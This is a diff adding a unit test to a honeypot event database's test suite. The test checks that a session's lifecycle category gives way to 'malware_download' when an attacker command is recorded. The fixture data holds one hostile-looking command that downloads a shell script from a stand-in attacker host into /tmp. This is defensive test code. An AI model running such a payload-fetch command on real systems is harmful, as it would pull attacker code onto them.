@@ -186,6 +186,35 @@ class DatabaseEventTests(unittest.TestCase):
         self.assertIn("brute_force", s["attack_categories"])
         self.assertIn("reconnaissance", s["attack_categories"])
 
+    def test_upsert_attack_session_drops_lifecycle_when_attack_category_arrives(self) -> None:
+        lifecycle = self._make_record(
+            session_id="sess1",
+            source_ip="10.0.0.1",
+            event_type="cowrie.session.connect",
+            classification={"attack_category": "session", "severity": "low"},
+        )
+        malware = self._make_record(
+            session_id="sess1",
+            source_ip="10.0.0.1",
+            event_type="cowrie.command.input",
+            command="wget http://bad.example.com/payload.sh -O /tmp/payload.sh",
+            classification={"attack_category": "malware_download", "severity": "high"},
+        )
+        closed = self._make_record(
+            session_id="sess1",
+            source_ip="10.0.0.1",
+            event_type="cowrie.session.closed",
+            classification={"attack_category": "session", "severity": "low"},
+        )
+
+        for record in (lifecycle, malware, closed):
+            self.db.insert_event(record)
+            self.db.upsert_attack_session(record)
+
+        sessions, total = self.db.query_attack_sessions()
+        self.assertEqual(total, 1)
+        self.assertEqual(sessions[0]["attack_categories"], ["malware_download"])
+
     def test_upsert_attack_session_tracks_malicious(self) -> None:
         rec = self._make_record(
             session_id="sess1",
